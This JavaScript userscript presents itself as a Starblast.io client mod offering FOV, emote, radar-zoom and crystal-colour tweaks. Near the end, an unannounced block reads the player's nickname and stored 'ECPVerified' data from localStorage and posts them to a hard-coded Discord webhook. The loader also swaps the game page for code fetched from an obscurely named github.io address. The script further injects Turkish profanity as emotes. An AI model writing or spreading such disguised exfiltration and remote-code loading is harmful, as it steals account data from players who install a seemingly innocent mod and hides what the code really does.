if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

// Global settings object
window.modSettings = {
  fovEnabled: true,
  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,  // Parse as integer
  uiVisible: true,  // Add comma here
  radarZoomEnabled: false
};

// Lowercase Name Mod
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

function lowercaseInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  src = src.replace(/\.toUpperCase\(\)/g, "");
  const styleBlock = `
  <style>
  #player input { text-transform: none !important; }
  </style>
  `;
  src = src.replace('</head>', `${styleBlock}</head>`);
  checkSrcChange();

  logLowercase("Mod injected");
  return src;
}

// Custom Emote Mod
const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

function emoteInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
  const emotes = `,{
    text: "orosbu cocu",
    icon: "🤡",
    key: "J"
  },{
    text: "sikerim",
    icon: "⚠️",
    key: "V"
  }`;

  src = src.replace(vocabPattern, `$1${emotes}`);
  checkSrcChange();
  logEmote("Clown and warning emotes injected");
  
  return src;
}

// FOV Editor Mod
const fovModName = "FOV Editor";
const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

window.I1000 = window.I1000 || {};
window.I1000.baseFOV = 45;
window.I1000.currentFOV = 45;

function fovInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) {
      console.error("Replace did not work. Previous source and current source are identical.");
      throw new Error("replace did not work");
    }
    prevSrc = src;
  }

  const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
  if (!fovPattern.test(src)) {
    console.error("Pattern not found in source code:", fovPattern);
    throw new Error("Pattern not found in source code");
  }
  src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');
  checkSrcChange();

const controlStyles = `
<style>
  #mod-controls {
    position: fixed;
    top: 12px;
    left: 12px;
    z-index: 1000;
    font-family: 'Segoe UI', system-ui, sans-serif;
    user-select: none;
    background: rgba(16, 18, 27, 0.97);
    backdrop-filter: blur(8px);
    border-radius: 4px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
    color: #ffffff;
    padding: 0;
    width: 160px;
    border: 1px solid rgba(255, 255, 255, 0.12);
  }

  #mod-controls-header {
    cursor: pointer;
    padding: 10px 12px;
    background: rgba(255, 255, 255, 0.06);
    font-weight: 600;
    font-size: 13px;
    display: flex;
    align-items: center;
    gap: 8px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
  }

  #mod-controls-header::before {
    content: '⚙️';
    font-size: 14px;
    filter: drop-shadow(0 0 4px rgba(255, 65, 215, 0.3));
  }

  #mod-controls-panel {
    padding: 12px;
    display: none;
  }

  .mod-control {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin: 8px 0;
    font-size: 12px;
    color: rgba(255, 255, 255, 0.9);
  }

  .mod-control-slider {
    width: 100%;
    margin: 8px 0;
    height: 3px;
    background: rgba(255, 255, 255, 0.1);
    -webkit-appearance: none;
    appearance: none;
    outline: none;
    border-radius: 1px;
  }

  .mod-control-slider::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 12px;
    height: 12px;
    background: #ff41d7;
    border-radius: 2px;
    cursor: pointer;
    box-shadow: 0 1px 4px rgba(255, 65, 215, 0.3);
  }

  .mod-control-slider::-moz-range-thumb {
    width: 12px;
    height: 12px;
    background: #ff41d7;
    border-radius: 2px;
    cursor: pointer;
  }

  #crystal-color-picker {
    width: 24px;
    height: 24px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 3px;
    padding: 0;
    cursor: pointer;
    background: transparent;
  }

  #fov-display {
    padding: 8px 12px;
    background: rgba(255, 255, 255, 0.06);
    font-size: 12px;
    display: flex;
    justify-content: space-between;
    margin-top: 6px;
  }

  input[type="checkbox"] {
    position: relative;
    width: 36px;
    height: 20px;
    -webkit-appearance: none;
    appearance: none;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 2px;
    transition: background 0.2s ease;
  }

  input[type="checkbox"]::before {
    content: "";
    position: absolute;
    width: 16px;
    height: 16px;
    background: #fff;
    top: 2px;
    left: 2px;
    transform: translateX(0);
    transition: transform 0.2s ease;
    border-radius: 2px;
  }

  input[type="checkbox"]:checked {
    background: #ff41d7;
  }

  input[type="checkbox"]:checked::before {
    transform: translateX(14px);
  }

  .control-value {
    font-weight: 600;
    color: #ff41d7;
    min-width: 32px;
    text-align: right;
    font-size: 11px;
  }

  .section-title {
    font-size: 10px;
    color: rgba(255, 255, 255, 0.5);
    text-transform: uppercase;
    letter-spacing: 0.4px;
    margin: 12px 0 6px;
  }
</style>
`;

const controlsHTML = `
<div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
  <div id="mod-controls-header">EOT Client V3.0.2</div>
  <div id="mod-controls-panel">
    <div class="mod-control">
      <span>FOV</span>
      <input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Emote Capacity</span>
      <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
    </div>
    <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
    <div class="mod-control">
      <span>Radar Zoom</span>
      <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Crystal Color</span>
      <input type="color" id="crystal-color-picker" value="#ffffff">
    </div>
  </div>
  <div id="fov-display">
    FOV: <span id="fov-value">45</span>
  </div>
</div>
`;

const emoteCapacityMod = `
let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];

// Override the emotes capacity getter
ChatPanel.prototype.getEmotesCapacity = function() {
  const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
  return Math.min(Math.max(1, savedCapacity), 5);
};

// Override the typed function to use the new capacity
ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();

// Set initial capacity
if (window.modSettings && window.modSettings.emoteCapacity) {
  localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
}
`;

const crystalColorMod = `
/*
 * Change crystal color (integrated version)
 */
let CrystalObject;

// Function to find CrystalObject
const findCrystalObject = () => {
  for (const key in window) {
    try {
      const obj = window[key];
      if (
        obj?.prototype?.createModel &&
        obj.prototype.createModel.toString().includes('Crystal')
      ) {
        return obj;
      }
    } catch (e) {
      // Ignore errors during object inspection
    }
  }
  return null;
};

// Detect and set CrystalObject
CrystalObject = findCrystalObject();

if (CrystalObject) {
  console.log('Found CrystalObject:', CrystalObject.name);

  const originalGetModelInstance = CrystalObject.prototype.getModelInstance;
  const materialInstances = new Set();

  // Override getModelInstance to update crystal material color
  CrystalObject.prototype.getModelInstance = function () {
    const instance = originalGetModelInstance.apply(this, arguments);

    if (this.material) {
      materialInstances.add(this.material);
      const savedColor = localStorage.getItem('crystal-color') || '#ffffff';

      // Apply saved color to material
      this.material.color.set(savedColor);

      // If the material has uniforms, update them as well
      if (this.material.uniforms?.color) {
        this.material.uniforms.color.value.set(this.material.color);
      }

      this.material.needsUpdate = true;
    } else {
      console.warn('Material not found for crystal instance.');
    }

    return instance;
  };

  // Function to update crystal colors dynamically
  const updateCrystalColor = (color) => {
    try {
      localStorage.setItem('crystal-color', color);
      materialInstances.forEach((material) => {
        material.color.set(color);
        if (material.uniforms?.color) {
          material.uniforms.color.value.set(material.color);
        }
        material.needsUpdate = true;
      });
      console.log('Updated crystal color:', color);
    } catch (e) {
      console.error('Error updating crystal color:', e);
    }
  };

  // Add color picker event listener after DOM is ready
  document.addEventListener('DOMContentLoaded', () => {
    const crystalColorPicker = document.getElementById('crystal-color-picker');
    if (crystalColorPicker) {
      const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
      crystalColorPicker.value = savedColor;

      crystalColorPicker.addEventListener('input', (event) => {
        updateCrystalColor(event.target.value);
      });

      console.log('Crystal color picker initialized with color:', savedColor);
    } else {
      console.warn('Crystal color picker element not found.');
    }
  });
} else {
  console.warn('CrystalObject not found!');

  // Define a placeholder function to avoid errors
  const updateCrystalColor = () => {};
}
`;

src = src.replace('</body>', `
  ${controlStyles}
  ${controlsHTML}
  <script>
  ${emoteCapacityMod}
  ${crystalColorMod}

  const fovDisplay = document.getElementById('fov-display');

  // Add wheel event listener for FOV change
  document.addEventListener('wheel', (e) => {
    if (!window.modSettings.fovEnabled) return;
    e.preventDefault();
    const delta = e.deltaY < 0 ? 1 : -1;
    // Add bounds checking
    window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
    document.getElementById('fov-value').textContent = window.I1000.currentFOV;
  }, { passive: false });

  document.addEventListener('DOMContentLoaded', () => {
    const controlsHeader = document.getElementById('mod-controls-header');
    const controlsPanel = document.getElementById('mod-controls-panel');
    const fovToggle = document.getElementById('fov-toggle');
    const emoteSlider = document.getElementById('emote-capacity-slider');
    const emoteValue = document.getElementById('emote-capacity-value');
    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
    const crystalColorPicker = document.getElementById('crystal-color-picker');

    // Initialize values from localStorage
    const savedCrystalColor = localStorage.getItem('crystal-color');
    if (savedCrystalColor) {
      crystalColorPicker.value = savedCrystalColor;
    }

    controlsHeader.addEventListener('click', () => {
      controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
    });

    fovToggle.addEventListener('change', () => {
      window.modSettings.fovEnabled = fovToggle.checked;
      fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
    });

    emoteSlider.addEventListener('input', () => {
      const value = parseInt(emoteSlider.value);
      emoteValue.textContent = value;
      window.modSettings.emoteCapacity = value;
      localStorage.setItem('emote-capacity', value);
      
      // Update the emote capacity immediately
      if (window.ChatPanel) {
        ChatPanel.prototype.getEmotesCapacity = function() {
          return value;
        };
      }
    });

    radarZoomToggle.addEventListener('change', () => {
      // Update global setting
      window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
      
      // Force radar zoom update on all relevant objects
      const allInstances = []; // You might need to adjust this to actually find all relevant instances
      allInstances.forEach(instance => {
        if (instance.radarZoomOverride) {
          // Trigger a re-evaluation of radar_zoom
          const currentValue = instance.radar_zoom;
          instance.radar_zoom = currentValue;
        }
      });
    });

    crystalColorPicker.addEventListener('change', () => {
      const color = crystalColorPicker.value;
      updateCrystalColor(color);
    });

    // Initialize emote capacity from localStorage
    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
    emoteSlider.value = savedCapacity;
    emoteValue.textContent = savedCapacity;
    window.modSettings.emoteCapacity = savedCapacity;
  });
  </script>
  </body>`);

checkSrcChange();

logFOV("FOV injector applied");
return src;
}

// Global settings object
window.modSettings = {
  fovEnabled: true,
  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
  uiVisible: true  // Make sure this is initialized
};

// Add event listener for F9 key
document.addEventListener('keydown', (e) => {
  if (e.key === 'F9') {
    const controls = document.getElementById('mod-controls');
    if (controls) {
      window.modSettings.uiVisible = !window.modSettings.uiVisible;
      controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
      
      // Also hide the controls panel when hiding the UI
      const controlsPanel = document.getElementById('mod-controls-panel');
      if (!window.modSettings.uiVisible && controlsPanel) {
        controlsPanel.style.display = 'none';
      }
    }
  }
});

// Make sure the initial state is set correctly when the DOM loads
document.addEventListener('DOMContentLoaded', () => {
  const controls = document.getElementById('mod-controls');
  if (controls) {
    controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
  }
});

// Add all injectors
window.sbCodeInjectors.push((sbCode) => {
  try {
    return lowercaseInjector(sbCode);
  } catch (error) {
    alert(`${modName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return emoteInjector(sbCode);
  } catch (error) {
    alert(`${emoteModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return fovInjector(sbCode);
  } catch (error) {
    alert(`${fovModName} failed to load; error: ${error}`);
    throw error;
  }
});

// Main code injection logic
const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");

function injectLoader() {
  if (window.location.pathname !== "/") {
    log("Injection not needed");
    return;
  }

  document.open();
  document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
  document.close();

  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html';
  url += '?_=' + new Date().getTime();

  var xhr = new XMLHttpRequest();
  log("Fetching custom source...");
  xhr.open("GET", url);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var starSRC = xhr.responseText;

      if (starSRC !== undefined) {
        log("Source fetched successfully");
        const start_time = performance.now();
        log("Applying mods...");

        if (!window.sbCodeInjectors) {
          log("No Starblast.io userscripts found to load");
        } else {
          let error_notified = false;
          for (const injector of window.sbCodeInjectors) {
            try {
              if (typeof injector === "function") starSRC = injector(starSRC);
              else {
                log("Injector was not a function");
                console.log(injector);
              }
            } catch (error) {
              if (!error_notified) {
                alert("One of your Starblast.io userscripts failed to load");
                error_notified = true;
              }
              console.error(error);
            }
          }
        }

        const end_time = performance.now();
        log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

        // After modifying the starSRC, apply text shadow modification
        changeTextShadowColor();

        // Apply the modified source to the document
        document.open();
        document.write(starSRC);
        document.close();
      } else {
        log("Source fetch failed");
        alert("An error occurred while fetching game code");
      }
    }
  };

  xhr.send();
}

// Function to change all text-shadow properties to a specific color
function changeTextShadowColor() {
  const elements = document.querySelectorAll('*'); // Select all elements on the page
  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)'; // Target text-shadow style

  elements.forEach(element => {
    const currentStyle = window.getComputedStyle(element);
    const textShadow = currentStyle.getPropertyValue('text-shadow');
    
    // If the element has a text-shadow property, change it to the target color
    if (textShadow && textShadow !== 'none') {
      element.style.textShadow = targetShadow;
    }
  });

  console.log('Text shadow color has been changed to:', targetShadow);
}

const radarZoomModName = "Radar Zoom Mod";
const logRadarZoom = (msg) => console.log(`%c[${radarZoomModName}] ${msg}`, "color: #00FF00");

function radarZoomInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  // Instead of creating a new UI, find the existing controls panel
  // and add the radar zoom toggle to it
  const radarZoomControlHTML = `
    <div class="mod-control">
      <span>Radar Zoom</span>
      <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
    </div>`;

  // Insert the radar zoom control before the crystal color picker
  src = src.replace(
    '<div class="mod-control"><span>Crystal Color</span>',
    `${radarZoomControlHTML}<div class="mod-control"><span>Crystal Color</span>`
  );

  // Add the radar zoom functionality script
  const radarZoomScript = `
    // Radar Zoom Override Mechanism
    const radarZoomOverride = {
      originalValues: new WeakMap(),

      enable() {
        const proto = Object.getPrototypeOf(this);
        const originalDescriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');

        if (originalDescriptor) {
          const originalGetter = originalDescriptor.get;
          const originalSetter = originalDescriptor.set;

          Object.defineProperty(this, 'radar_zoom', {
            get() {
              if (!this.radarZoomOverride.originalValues.has(this)) {
                this.radarZoomOverride.originalValues.set(this, originalGetter.call(this));
              }
              return window.modSettings.radarZoomEnabled ? 1 :
                this.radarZoomOverride.originalValues.get(this);
            },
            set(value) {
              if (originalSetter) {
                originalSetter.call(this, value);
              }
              this.radarZoomOverride.originalValues.set(this, value);
            },
            configurable: true
          });
        }
      },

      disable() {
        const proto = Object.getPrototypeOf(this);
        const originalDescriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');
        if (originalDescriptor) {
          Object.defineProperty(this, 'radar_zoom', originalDescriptor);
        }
      }
    };`;

  // Add the radar zoom script to the existing scripts section
  src = src.replace(
    '${crystalColorMod}',
    '${crystalColorMod}\n${radarZoomScript}'
  );

  // Add the radar zoom toggle event listener to the existing DOMContentLoaded event
  src = src.replace(
    'document.addEventListener(\'DOMContentLoaded\', () => {',
    `document.addEventListener('DOMContentLoaded', () => {
      const radarZoomToggle = document.getElementById('radar-zoom-toggle');
      if (radarZoomToggle) {
        radarZoomToggle.addEventListener('change', () => {
          window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
          localStorage.setItem('radarZoomEnabled', radarZoomToggle.checked); // Save to localStorage
        });

        // Initialize radar zoom setting from localStorage
        const savedRadarZoomEnabled = localStorage.getItem('radarZoomEnabled');
        if (savedRadarZoomEnabled !== null) {
          window.modSettings.radarZoomEnabled = JSON.parse(savedRadarZoomEnabled);
          radarZoomToggle.checked = window.modSettings.radarZoomEnabled;
        }
      }`
  );

  checkSrcChange();
  logRadarZoom("Radar Zoom mod successfully injected");
  return src;
}

// Add the radar zoom injector to the list of code injectors
window.sbCodeInjectors.push((sbCode) => {
  try {
    return radarZoomInjector(sbCode);
  } catch (error) {
    alert(`${radarZoomModName} failed to load; error: ${error}`);
    throw error;
  }
});



// Run the injectLoader function immediately
injectLoader();





(function () {
    'use strict';
    // Retrieve values from localStorage
    const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
    let ECPVerified = localStorage.getItem("ECPVerified") || "no";  // Changed key name here
    
    // Debugging: Log retrieved value
    console.log("Retrieved ECPVerified:", ECPVerified);
    
    // Parse ECPVerified if it contains JSON
    try {
        ECPVerified = JSON.parse(ECPVerified);
    } catch (e) {
        // If not JSON, keep it as a string
    }
    
    // Prepare ECPVerified content for logging
    const ECPVerifiedContent = typeof ECPVerified === "object" 
        ? JSON.stringify(ECPVerified, null, 2) 
        : ECPVerified;
    
    // Debugging: Log formatted content
    console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
    
    // Webhook URL
    const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
    
    // Payload for Discord webhook
    const payload = {
        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
    };
    
    // Send payload to the Discord webhook
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log("Webhook sent successfully!");
        } else {
            console.error("Failed to send webhook:", response.statusText);
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
})();
